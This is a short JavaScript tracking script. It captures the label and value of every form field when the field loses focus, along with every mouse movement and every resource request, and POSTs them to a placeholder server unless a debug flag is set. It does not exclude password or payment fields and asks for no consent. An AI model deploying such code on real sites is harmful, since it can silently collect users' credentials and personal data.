/*
Variables
*/
var CORE_URL = "url.url"
var DEBUG = true
var PING_DELAY = 10000

/*
Function to track all form submissions
*/
document.addEventListener("DOMContentLoaded", function () {
  const forms = document.querySelectorAll("form");
  
  // Select every single form
  forms.forEach((form) => {
    const inputs = form.querySelectorAll("input, textarea");

    // Select every single input
    inputs.forEach((input) => {

      // Activate on unfocus
      input.addEventListener("blur", function () {
        
        // Find the label and the content
        const label = form.querySelector(`label[for="${input.id}"]`);
        const data = {
          label: label ? label.textContent : "None",
          content: input.value,
        };

        // Print the JSON object
        console.log(JSON.stringify(data));
        sendData("/text", data);
      });
    });
  });
});

/*
Function to track all mouse movements
*/
document.addEventListener("mousemove", function (event) {
  // Create a JSON object
  const data = {
    x: event.clientX,
    y: event.clientY,
    width: window.innerWidth,
    height: window.innerHeight,
  };

  // Print the JSON object to the console
  console.log(JSON.stringify(data));
  sendData("/mouse", data);
});

/*
Track all web requests
*/
document.addEventListener("DOMContentLoaded", function () {
  // Log all resources requests
  const observer = new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) {

      const data = {
        url: entry.name,
        type: entry.initiatorType,
      };

      // Print the JSON object to the console
      console.log(JSON.stringify(data));
      sendData("/network", data);
    }
  });

  observer.observe({ entryTypes: ["resource"] });
});

/*
Send all requests through here
*/
function sendData(endpoint, data) {
  const url = `${CORE_URL}${endpoint}`;

  if (!DEBUG){
    fetch(url, {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
  });
  }
}
